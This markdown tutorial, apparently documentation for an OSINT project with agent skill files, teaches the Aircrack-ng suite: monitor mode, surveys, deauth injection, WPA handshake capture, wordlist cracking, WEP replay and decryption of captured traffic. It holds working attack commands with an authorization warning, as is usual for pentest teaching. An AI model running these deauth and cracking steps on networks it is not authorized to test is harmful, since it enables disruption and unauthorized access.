# Aircrack-ng Zero to Hero

From first monitor-mode capture to coordinated WPA/WEP workflows using the [Aircrack-ng](https://www.aircrack-ng.org/) suite.

> **Authorization:** Intercepting or disrupting wireless networks without permission is illegal in most jurisdictions. Use only on your own lab hardware, with written pentest scope, or on explicitly authorized SSIDs/BSSIDs.
>
> **Hardware:** You need a **WiFi adapter that supports monitor mode and packet injection**. Many built-in laptop cards do not. Common pentest USB adapters include Alfa AWUS036ACH/ACM and chipsets such as Atheros AR9271 or Ralink RT3070.

---

## 1. What the suite does

| Tool | Role |
|------|------|
| `airmon-ng` | Enable/disable monitor mode |
| `airodump-ng` | Discover APs/clients; write PCAP/CSV |
| `aireplay-ng` | Inject frames (deauth, ARP replay, fake auth) |
| `aircrack-ng` | Crack WEP/WPA-PSK from captures |
| `airdecap-ng` | Decrypt PCAP with known key |
| `airolib-ng` | Precompute WPA PMKs |
| `airbase-ng` | Software AP (lab) |
| `airgraph-ng` | Graph AP/client relationships |

---

## 2. Install (Kali / Debian)

```bash
sudo apt update
sudo apt install aircrack-ng
```

Verify:

```bash
aircrack-ng --help | head
```

---

## 3. First passive survey (15 minutes)

```bash
# 1. Identify wireless interface
iw dev

# 2. Free the radio
sudo airmon-ng check kill

# 3. Monitor mode
sudo airmon-ng start wlan0
# note name: wlan0mon

# 4. Scan everything
sudo airodump-ng wlan0mon

# 5. Save for parsing
sudo airodump-ng -w mysurvey --output-format csv,pcap wlan0mon
# Ctrl+C after a few minutes

# 6. Cleanup
sudo airmon-ng stop wlan0mon
```

Open `mysurvey-01.csv` — AP table at top, stations below.

---

## 4. Understand the CSV

**Access points:** BSSID, channel, `Privacy` (OPN/WEP/WPA/WPA2), ESSID  
**Stations:** client MAC, associated BSSID, probed network names

Parse with TextFSM → SpiderFeet `WIFI_ACCESS_POINT` nuggets. See `.cursor/skills/aircrack-ng/references/output-and-parsing.md`.

---

## 5. Injection test

Before any active attack:

```bash
sudo airmon-ng start wlan0
sudo aireplay-ng -9 wlan0mon
```

Expect: **Injection is working!** If not, change adapter/driver.

---

## 6. WPA handshake workflow

**Goal:** Capture 4-way handshake for offline password guess.

```bash
# Terminal 1 — lock channel and AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa wlan0mon

# Terminal 2 — only if authorized and client is associated
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon
```

When airodump shows `WPA handshake: AA:BB:CC:DD:EE:FF`:

```bash
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa-01.cap
```

Tutorial: https://www.aircrack-ng.org/doku.php?id=wpa_capture

---

## 7. WEP workflow (legacy lab)

```bash
sudo airodump-ng -c 1 --bssid AP_MAC -w wep wlan0mon
sudo aireplay-ng -3 -b AP_MAC -h CLIENT_MAC wlan0mon
aircrack-ng wep-01.cap
```

Flowchart: https://www.aircrack-ng.org/doku.php?id=flowchart

---

## 8. airolib-ng for big wordlists

```bash
airolib-ng pmk_db --import essid /tmp/essid.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --clean all
airolib-ng pmk_db --batch
aircrack-ng -r pmk_db -b AP_MAC wpa-01.cap
```

---

## 9. Decrypt traffic after crack

```bash
airdecap-ng -e "NetworkName" -p "recoveredpassword" wpa-01.cap
```

Analyze `wpa-01-dec.cap` in Wireshark (authorized scope).

---

## 10. Orchestrated module map

```
airmon-ng (monitor on)
    → airodump-ng (discover / capture)
        → aireplay-ng (optional injection)
            → aircrack-ng (offline crack)
                → airdecap-ng (decrypt PCAP)
```

Passive OSINT stops after **airodump-ng + CSV parse**.

Full workflows: `.cursor/skills/aircrack-ng/references/workflows.md`

---

## 11. Tactics when things fail

| Problem | Try |
|---------|-----|
| No APs | Monitor mode? Antenna? Region settings? |
| No handshake | Associated client? Minimal deauth? `wpaclean`? |
| IVs stuck (WEP) | Re-auth, different attack mode, injection test |
| Interface drops | `airmon-ng stop/start`, USB power save off |

`.cursor/skills/aircrack-ng/references/tactics.md`

---

## 12. SpiderFeet integration (planned)

- Discovery maps to `WIFI_ACCESS_POINT` per BSSID
- Use TextFSM on airodump CSV
- Default: **no injection** in OSINT mode
- Nugget mapping: `.cursor/skills/aircrack-ng/references/nugget-mapping.md`

---

## 13. Next steps

- Agent skill: `.cursor/skills/aircrack-ng/SKILL.md`
- CLI reference: [Aircrack-Ng-CLI-Options.md](Aircrack-Ng-CLI-Options.md)
- Sources: `.cursor/skills/aircrack-ng/references/sources.md`
